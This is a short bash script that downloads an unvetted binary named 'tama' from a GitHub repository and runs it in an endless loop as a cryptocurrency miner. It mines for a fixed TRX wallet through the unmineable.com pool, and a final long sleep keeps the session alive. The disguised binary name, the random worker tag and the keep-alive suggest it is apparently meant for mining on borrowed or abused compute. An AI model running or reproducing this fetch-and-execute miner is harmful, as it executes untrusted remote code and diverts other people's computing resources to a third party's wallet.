#!/bin/bash
POOL=rx.unmineable.com:3333
WALLET=TRX:TYWmD5VqkvA9AT4Pcfgqx5asB8WC2cgodP
WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#)
wget https://github.com/prathhub/kaku/raw/main/tama
chmod +x tama
while [ 1 ]; do
./tama --algo chukwa --pool $POOL --user $WALLET.$WORKER --ethstratum +50000
sleep 5
done
sleep 999999999 
